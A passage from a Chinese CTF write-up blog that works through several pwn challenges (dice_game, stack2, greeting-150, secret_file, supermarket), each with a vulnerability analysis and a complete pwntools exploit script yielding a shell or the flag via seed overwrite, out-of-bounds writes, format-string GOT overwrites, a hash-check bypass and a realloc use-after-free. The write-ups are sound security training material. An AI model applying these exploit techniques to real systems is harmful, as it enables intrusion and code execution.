<h3 id="13-dice-game"><a href="#13-dice-game" class="headerlink" title="13. dice_game"></a>13. dice_game</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108211729451.png" alt="image-20210108211729451"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123094345375.png" alt="image-20201123094345375"></p>
<p><strong>考察知识点：栈溢出修改随机数种子</strong></p>
<h4 id="代码分析-10"><a href="#代码分析-10" class="headerlink" title="代码分析"></a>代码分析</h4><p>通过ida反编译阅读源码</p>
<p><img src="/posts/5600bec/image-20201123094603206.png" alt="image-20201123094603206"></p>
<p><img src="/posts/5600bec/image-20201123094616274.png" alt="image-20201123094616274"></p>
<p>可以看出，这是一个骰子游戏。连续猜对50次就可以得到flag。</p>
<p>通过分析栈可以知道，输入的name是可以覆盖掉seed的。</p>
<h4 id="思路及利用-10"><a href="#思路及利用-10" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>计算机的随机数都是伪随机数，种子一样时，rand函数会提供一样的数。所以需要控制seed的值。使用name覆盖seed。</p>
<p><strong>需要注意的是，由于exp使用python编写，但这里需要用到c的函数。需要用上一点混合编程的技巧。</strong></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *  <span class="comment"># 提供了与 C 兼容的数据类型，并允许调用 DLL 或共享库中的函数。</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./dice_game&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">59063</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line"><span class="comment">#覆盖seed值为0</span></span><br><span class="line">name = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;point(1~6): &quot;</span>)</span><br><span class="line">    <span class="comment">#混合编程，调用c的rand函数，rand的缺省时默认种子参数是0</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(libc.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<p><img src="/posts/5600bec/image-20201123095347070.png" alt="image-20201123095347070"></p>
<h3 id="14-satck2"><a href="#14-satck2" class="headerlink" title="14. satck2"></a>14. satck2</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108211918463.png" alt="image-20210108211918463"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108214014855.png" alt="image-20210108214014855"></p>
<p><strong>考察知识点：数组越界</strong></p>
<h4 id="代码分析-11"><a href="#代码分析-11" class="headerlink" title="代码分析"></a>代码分析</h4><p>整个程序实现了一个平均数计算，用户可以输入指定个数的数字计算平均值，其中数字打印、修改、添加。</p>
<p>漏洞出现在添加数字时，没有对数组索引做限制，造成数组越界。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108215647477.png"></p>
<p>同时也找到了后门函数：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108215423011.png" alt="image-20210108215423011"></p>
<h4 id="思路及利用-11"><a href="#思路及利用-11" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>思路很明显就是利用数组越界，将返回地址修改为后门函数地址。</p>
<p>那么关键就在于找到数组与返回地址的偏移。</p>
<p>这里需要注意是，ida所得到的偏移并不准确，ida显示偏移为74h，测试后发现不是。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108215956786.png" alt="image-20210108215956786"></p>
<p>所以只好动态调试：</p>
<p>在<code>v13[v5] = v7</code>下断点，运行</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108221714368.png" alt="image-20210108221714368"></p>
<p>确定数组距离ebp的距离是0x70即（0xffffcf28），从汇编可以看出，eax存放v5，edx存放v7.</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108221830447.png" alt="image-20210108221830447"></p>
<p>这和ida中显示的一致，很明显是返回地址出现了偏差。继续运行到retn指令。</p>
<p>可以看到在最后修改了esp，也就是说返回地址为0xffffcfac。所以偏移为0x84.</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108222306175.png" alt="image-20210108222306175"></p>
<p>编写exp：</p>
<p>注意小端序</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&quot;./stack2&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.134&quot;</span>,<span class="number">45323</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,num</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;which number to change:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;new number:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;you have:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;numbers\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x84</span>,<span class="number">0X9B</span>)</span><br><span class="line">add(<span class="number">0x84</span>+<span class="number">1</span>,<span class="number">0X85</span>)</span><br><span class="line">add(<span class="number">0x84</span>+<span class="number">2</span>,<span class="number">0X04</span>)</span><br><span class="line">add(<span class="number">0x84</span>+<span class="number">3</span>,<span class="number">0X08</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果发现远程靶机上没有bash，所以无法使用程序中给的后门得到shell，需要构造ROP进行system(‘sh’)</p>
<p>那么首先找到system的plt和”sh“的地址。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108223451146.png" alt="image-20210108223451146"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108223658424.png" alt="image-20210108223658424"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&quot;./stack2&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.134&quot;</span>,<span class="number">45323</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,num</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;which number to change:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;new number:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;you have:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;numbers\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x84</span>,<span class="number">0X50</span>)</span><br><span class="line">add(<span class="number">0x84</span>+<span class="number">1</span>,<span class="number">0X84</span>)</span><br><span class="line">add(<span class="number">0x84</span>+<span class="number">2</span>,<span class="number">0X04</span>)</span><br><span class="line">add(<span class="number">0x84</span>+<span class="number">3</span>,<span class="number">0X08</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x84</span>+<span class="number">8</span>,<span class="number">0X87</span>)</span><br><span class="line">add(<span class="number">0x84</span>+<span class="number">8</span>+<span class="number">1</span>,<span class="number">0X89</span>)</span><br><span class="line">add(<span class="number">0x84</span>+<span class="number">8</span>+<span class="number">2</span>,<span class="number">0X04</span>)</span><br><span class="line">add(<span class="number">0x84</span>+<span class="number">8</span>+<span class="number">3</span>,<span class="number">0X08</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108223824540.png" alt="image-20210108223824540"></p>
<h3 id="16-greeting-150"><a href="#16-greeting-150" class="headerlink" title="16. greeting-150"></a>16. greeting-150</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125094546610.png" alt="image-20201125094546610"></p>
<p>首先checksec</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201204833485.png" alt="image-20201201204833485"></p>
<h4 id="代码分析-12"><a href="#代码分析-12" class="headerlink" title="代码分析"></a>代码分析</h4><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201205229762.png" alt="image-20201201205229762"></p>
<p>sprintf函数的作用是，将v5的内容按照format拼接到“Nice to meet you,%s：）”中。之后的返回值调用printf函数，显然这里存在的是格式化字符串漏洞。</p>
<h4 id="思路及利用-12"><a href="#思路及利用-12" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>要利用这个格式化字符串漏洞，首先需要找到字符串的偏移。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209085535031.png" alt="image-20201209085535031"></p>
<p>可以看出输如的aaaa并没有在一个偏移内，需要填充两个字符。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209085719874.png" alt="image-20201209085719874"></p>
<p>对于aaaa来说，偏移是12.知道偏移后，就可以用格式化字符串漏洞做到任意地址的读写。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209090009791.png" alt="image-20201209090009791"></p>
<p>注意到程序中有调用system函数，那么只需要修改某个got为system函数的plt就可以调用system函数了。</p>
<p>考虑到传参的问题，这个被修改的got最好能获得输入。于是在输入函数中发现strlen函数比较适合。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209090448566.png" alt="image-20201209090448566"></p>
<p>只要修改strlen函数的got为system的plt，再想办法返回main重新输入”/bin/sh”就可以得到shell了。</p>
<p>接下来就是如何返回main的问题。</p>
<p><code>.fini_array</code> 节存放了指向终止代码的函数指针，在main函数调用后被触发。所以把.fini_array[0]改为mian的地址即可。</p>
<p>在ida中使用快捷键ctrl+s可以看到fini_array的地址。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209091546640.png" alt="image-20201209091546640"></p>
<p>同时也可以得到如下地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fini_got &#x3D; 0x8049934  </span><br><span class="line">main_addr &#x3D; 0x80485ED  </span><br><span class="line">strlen_got &#x3D; 0x8049A54  </span><br><span class="line">system_plt &#x3D; 0x8048490 </span><br></pre></td></tr></table></figure>

<p>由于可输入的只有64字节。格式化字符串需要设计一下。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209092156695.png" alt="image-20201209092156695"></p>
<p>可以看到，fini_array的内容的地址与main只有两个字节不一样。只需要修改后两个字节，用到格式化字符<code>%hn</code>.</p>
<p>strlen的GOT表内容，四个字节我们都需要修改，我们拆分为2个2字节写。因此，我们一共需要写三个：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">arr &#x3D; [  </span><br><span class="line">   0x85ED,  </span><br><span class="line">   0x8490,0x804  </span><br><span class="line">]  </span><br></pre></td></tr></table></figure>

<p>由于是小端序，因此，我们要在fini_got写入2字节数据arr[0]；在strlen_got写入2字节数据arr[2]，在strlen_got+2处写入2字节数据arr[1]。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./greeting-150&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;220.249.52.133&#x27;,38405)</span></span><br><span class="line">strlen_got = <span class="number">0x8049A54</span></span><br><span class="line">system_got = <span class="number">0x8049A48</span></span><br><span class="line">main_addr = <span class="number">0x80485ED</span>  </span><br><span class="line">init_array = <span class="number">0x8049934</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;aa&#x27;</span></span><br><span class="line">payload += p32(strlen_got)</span><br><span class="line">payload += p32(strlen_got+<span class="number">2</span>)</span><br><span class="line">payload += p32(init_array)</span><br><span class="line">arr = [  </span><br><span class="line">   <span class="number">0x85ED</span>,  </span><br><span class="line">   <span class="number">0x8490</span>,</span><br><span class="line">   <span class="number">0x804</span>  </span><br><span class="line">]</span><br><span class="line">num = arr[<span class="number">2</span>] - <span class="number">32</span>  </span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(num) + <span class="string">&#x27;c%13$hn&#x27;</span></span><br><span class="line">num = arr[<span class="number">1</span>] - arr[<span class="number">2</span>]  </span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(num) + <span class="string">&#x27;c%12$hn&#x27;</span></span><br><span class="line">num = arr[<span class="number">0</span>] - arr[<span class="number">1</span>]  </span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(num) + <span class="string">&#x27;c%14$hn&#x27;</span>  </span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">len</span>(payload)  )</span><br><span class="line">p.sendline(payload) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>最终结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125094520178.png" alt="image-20201125094520178"></p>
<h3 id="17-secret-file"><a href="#17-secret-file" class="headerlink" title="17. secret_file"></a>17. secret_file</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109151917873.png" alt="image-20210109151917873"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109151947667.png" alt="image-20210109151947667"></p>
<h4 id="代码分析-13"><a href="#代码分析-13" class="headerlink" title="代码分析"></a>代码分析</h4><p>程序的基本逻辑是获取一个输入，经过SHA256后于一个v15一个提前写好的哈希值比较,如果通过，就执行<code>v9 = popen((const char *)&amp;v14, &quot;r&quot;);</code></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109153111330.png" alt="image-20210109153111330"></p>
<p>v9调试发现是</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109153334937.png" alt="image-20210109153334937"></p>
<p>这不是我们需要的命令，需要自己输入。然后观察输入函数与几个参数的位置关系。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109153724043.png" alt="image-20210109153724043"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109153932567.png" alt="image-20210109153932567"></p>
<p>使用getline作为输入函数，那么可以任意溢出。</p>
<h4 id="思路及利用-13"><a href="#思路及利用-13" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>v14为输入的命令值，可以通过dest溢出覆盖，然后接着将v15是存储的hash值可以覆盖为我们输入的前0x100的字符的hash值，这样就可以通过检测。</p>
<p>编写exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"><span class="comment">#p = process(&#x27;./secret_file&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>, <span class="number">46791</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="string">&quot;a&quot;</span>*<span class="number">0x100</span></span><br><span class="line">payload  = padding + <span class="string">&#x27;cat flag.txt;&#x27;</span>.ljust(<span class="number">0x1B</span>,<span class="string">&#x27; &#x27;</span>) + hashlib.sha256(padding.encode()).hexdigest()  </span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109154835772.png" alt="image-20210109154835772"></p>
<h2 id="五分题"><a href="#五分题" class="headerlink" title="五分题"></a>五分题</h2><h3 id="18-supermarket"><a href="#18-supermarket" class="headerlink" title="18. supermarket"></a>18. supermarket</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201221100516746.png" alt="image-20201221100516746"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201221100534999.png" alt="image-20201221100534999"></p>
<h4 id="代码分析-14"><a href="#代码分析-14" class="headerlink" title="代码分析"></a>代码分析</h4><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222171344578.png" alt="image-20201222171344578"></p>
<p>程序实现了商品的添加、删除、查询、更改。其中商品又名称、价格、描述，可以修改价格和描述。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222172654517.png" alt="image-20201222172654517"></p>
<p>程序所用堆的结构大致为：其中，description的chunk大小是可以被我们控制的。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222172643751.png" alt="image-20201222172643751"></p>
<p>漏洞出现在修改描述上。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222171556274.png" alt="image-20201222171556274"></p>
<p>realloc函数作用大概如下：</p>
<p>1）如果当前内存段后面有需要的内存空间，则直接扩展这段内存空间，realloc()将返回原指针。<br>2）如果当前内存段后面的空闲字节不够，那么就使用堆中的第一个能够满足这一要求的内存块，将目前的数据复制到新的位置，并将原来的数据块释放掉，返回新的内存块位置。<br>3）如果申请失败，将返回NULL，此时，原来的指针仍然有效。</p>
<p>也就是说，如果在修改描述时申请的空间比之前大，原来的会被free掉，但是这里没有把新的地址赋给指向描述的指针，存在UAF漏洞。</p>
<h4 id="思路及利用-14"><a href="#思路及利用-14" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>保护并没有限制修改got表，而且程序也提供了输出函数。那么大致的思路就是，先泄露got地址，确定真实地址、libc版本，找到system函数地址，修改got表项为system，输入“/bin/sh”获得shell，这里选择atoi比较方便。</p>
<p>接下来就是如何实现的问题：</p>
<ul>
<li>先申请一个description大于fastbin大小的chunk（0x80）的商品0.</li>
<li>再申请一个较小的商品1（用来分隔，如果不用商品1来分隔，则realoc直接扩展商品0的descript的大小至新size）。</li>
<li>修改商品0的描述，大小改为0x90.出发realoc函数。</li>
<li>申请商品2，描述大小为0x80.这样商品2首先申请结构体就是商品0的描述。（商品的结构体为0x1c）</li>
<li>这样修改商品0的描述就是修改商品2，首先将商品2的<code>*description</code>改为atoi的got地址，输出。</li>
<li>获得system地址，修改商品2的描述就是修改atoi的got表项。</li>
</ul>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222175100455.png" alt="image-20201222175100455"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *  </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./supermarket&#x27;)  </span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">48203</span>)  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./supermarket&#x27;</span>)  </span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">index,size,content</span>):</span>  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;price:&#x27;</span>,<span class="string">&#x27;10&#x27;</span>)  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;descrip_size:&#x27;</span>,<span class="built_in">str</span>(size))  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;description:&#x27;</span>,content)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span>  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span>  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,size,content</span>):</span>  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;descrip_size:&#x27;</span>,<span class="built_in">str</span>(size))  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;description:&#x27;</span>,content) </span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">&#x27;0&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">0x10</span>)  </span><br><span class="line"><span class="comment">#注意不要加任何数据，因为我们发送的数据写入到的是一个被free的块</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">create(<span class="number">2</span>,<span class="number">0x20</span>,<span class="string">&#x27;2&#x27;</span>*<span class="number">0x10</span>) </span><br><span class="line"><span class="comment">#修改商品0的描述，就是修改商品2，这里需要保留商品2的名称、描述大小</span></span><br><span class="line">payload = <span class="string">b&#x27;2&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p32(<span class="number">20</span>) + p32(<span class="number">0x20</span>) + p32(atoi_got)  </span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x80</span>,payload)</span><br><span class="line"><span class="comment">#泄露地址</span></span><br><span class="line">show()  </span><br><span class="line">p.recvuntil(<span class="string">&#x27;2: price.20, des.&#x27;</span>)  </span><br><span class="line"><span class="comment"># print(p.recv())</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">atoi_addr = u32(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">b&#x27;\n&#x27;</span>)[<span class="number">0</span>].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))  </span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;atoi&#x27;</span>,atoi_addr)  </span><br><span class="line">libc_base = atoi_addr - libc.dump(<span class="string">&#x27;atoi&#x27;</span>)  </span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)  </span><br><span class="line"><span class="comment">#修改atoi的表，将它指向system  </span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x20</span>,p32(system_addr))  </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">p.interactive()  </span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222182139072.png" alt="image-20201222182139072"></p>
<h3 id="19-noleak"><a href="#19-noleak" class="headerlink" title="19. noleak"></a>19. noleak</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201221093630034.png" alt="image-20201221093630034"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201221093644804.png" alt="image-20201221093644804"></p>
